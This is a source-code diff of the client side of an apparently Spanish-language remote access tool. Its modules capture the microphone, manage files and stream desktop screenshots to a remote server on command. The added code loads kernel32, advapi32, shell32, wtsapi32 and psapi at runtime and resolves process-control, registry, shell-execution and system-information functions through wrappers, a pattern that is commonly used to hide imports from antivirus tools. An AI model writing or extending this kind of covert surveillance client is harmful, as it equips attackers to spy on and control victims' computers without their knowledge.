@@ -1,3 +1,4 @@
+#include "custom_defines.hpp"
 #include "cliente.hpp"
 #include "mod_mic.hpp"
 #include "mod_file_manager.hpp"
@@ -100,11 +101,69 @@ void Cliente::setKillSwitch(bool _value) {
 
 Cliente::Cliente() {
     this->Init_Key();
+
+    //Cargar dlls y funciones
+    this->hKernel32DLL = wrapLoadDLL("kernel32.dll");
+    this->hAdvapi32DLL = wrapLoadDLL("advapi32.dll");
+    this->hShell32DLL = wrapLoadDLL("shell32.dll");
+    this->hWtsapi32DLL = wrapLoadDLL("Wtsapi32.dll");
+    this->hPsApiDLL = wrapLoadDLL("psapi.dll");
+
+    
+    if (this->hKernel32DLL) {
+        this->KERNEL32.pGetComputerName      = (st_Kernel32::LPGETCOMPUTERNAMEA)   wrapGetProcAddr(this->hKernel32DLL, "GetComputerNameA");
+        this->KERNEL32.pGetNativeSystemInfo  = (st_Kernel32::LPGETNATIVESYSTEMINFO)wrapGetProcAddr(this->hKernel32DLL, "GetNativeSystemInfo");
+        this->KERNEL32.pCreateProcessA       = (st_Kernel32::LPCREATEPROCESSA)     wrapGetProcAddr(this->hKernel32DLL, "CreateProcessA");
+        this->KERNEL32.pOpenProcess          = (st_Kernel32::LPOPENPROCESS)        wrapGetProcAddr(this->hKernel32DLL, "OpenProcess");
+        this->KERNEL32.pTerminateProcess     = (st_Kernel32::LPTERMINATEPROCESS)   wrapGetProcAddr(this->hKernel32DLL, "TerminateProcess");
+        this->KERNEL32.pCloseHandle          = (st_Kernel32::LPCLOSEHANDLE)        wrapGetProcAddr(this->hKernel32DLL, "CloseHandle");
+        this->KERNEL32.pGlobalMemoryStatusEx = (st_Kernel32::LPGLOBALMEMORYSTATUSEX)wrapGetProcAddr(this->hKernel32DLL, "GlobalMemoryStatusEx");
+    }
+
+    if (this->hAdvapi32DLL) {
+        this->ADVAPI32.pGetUserName     = (st_Advapi32::LPGETUSERNAMEA)   wrapGetProcAddr(this->hAdvapi32DLL, "GetUserNameA");
+        this->ADVAPI32.pRegOpenKeyEx    = (st_Advapi32::LPREGOPENKEY)     wrapGetProcAddr(this->hAdvapi32DLL, "RegOpenKeyExA");
+        this->ADVAPI32.pRegQueryValueEx = (st_Advapi32::LPREGQUERYVALUEEX)wrapGetProcAddr(this->hAdvapi32DLL, "RegQueryValueExA");
+        this->ADVAPI32.pRegCloseKey     = (st_Advapi32::LPREGCLOSEKEY)    wrapGetProcAddr(this->hAdvapi32DLL, "RegCloseKey");
+        this->ADVAPI32.pLookupAccountSidA = (st_Advapi32::LPLOOKUPACCOUNTSIDA)wrapGetProcAddr(this->hAdvapi32DLL, "LookupAccountSidA");
+    }
+
+    if (this->hShell32DLL) {
+        this->SHELL32.pShellExecuteExA = (st_Shell32::LPSHELLEXECUTEEXA)wrapGetProcAddr(this->hShell32DLL, "ShellExecuteExA");
+    }
+
+    if (this->hWtsapi32DLL) {
+        this->WTSAPI32.pWTSEnumerateProcessesA = (st_Wtsapi32::LPWTSENUMERATEPROCESSES)wrapGetProcAddr(this->hWtsapi32DLL, "WTSEnumerateProcessesA");
+        this->WTSAPI32.pWTSFreeMemory = (st_Wtsapi32::LPWTSFREEMEMORY)wrapGetProcAddr(this->hWtsapi32DLL, "WTSFreeMemory");
+    }
+
+    if (this->hPsApiDLL) {
+        this->PSAPI.pGetModuleFileNameExA = (st_PsApi::LPGETMODULEFILNAMEEX)wrapGetProcAddr(this->hPsApiDLL, "GetModuleFileNameExA");
+
+    }
+    
 }
 
 Cliente::~Cliente() {
 	this->CerrarConexion();
     this->DestroyClasses();
+
+    //Cerrar dlls
+    if (this->hKernel32DLL) {
+        wrapFreeLibrary(this->hKernel32DLL);
+    }
+
+    if (this->hAdvapi32DLL) {
+        wrapFreeLibrary(this->hAdvapi32DLL);
+    }
+
+    if (this->hShell32DLL) {
+        wrapFreeLibrary(this->hShell32DLL);
+    }
+
+    if (this->hWtsapi32DLL) {
+        wrapFreeLibrary(this->hWtsapi32DLL);
+    }
 }
 
 void Cliente::CerrarConexion() {
@@ -702,7 +761,8 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
                 int iMonitorIndex = atoi(strIn[1].c_str());
                 _DBG_("Enviando captura de pantalla. Index:", iMonitorIndex);
                 _DBG_("Calidad:", iQuality);
-                std::vector<char> vcDeskBuffer = this->mod_RemoteDesk->getBitmapBytes(this->mod_RemoteDesk->getFrameBitmap(iQuality, iMonitorIndex), iQuality);
+                std::shared_ptr<Gdiplus::Bitmap> bitmapBits = this->mod_RemoteDesk->getFrameBitmap(iQuality, iMonitorIndex);
+                std::vector<char> vcDeskBuffer = this->mod_RemoteDesk->getBitmapBytes(bitmapBits, iQuality);
                 int iBufferSize = vcDeskBuffer.size();
                 if (iBufferSize > 0) {
                     this->cChunkSend(this->sckSocket, vcDeskBuffer.data(), iBufferSize, 0, true, nullptr, EnumComandos::RD_Salida);
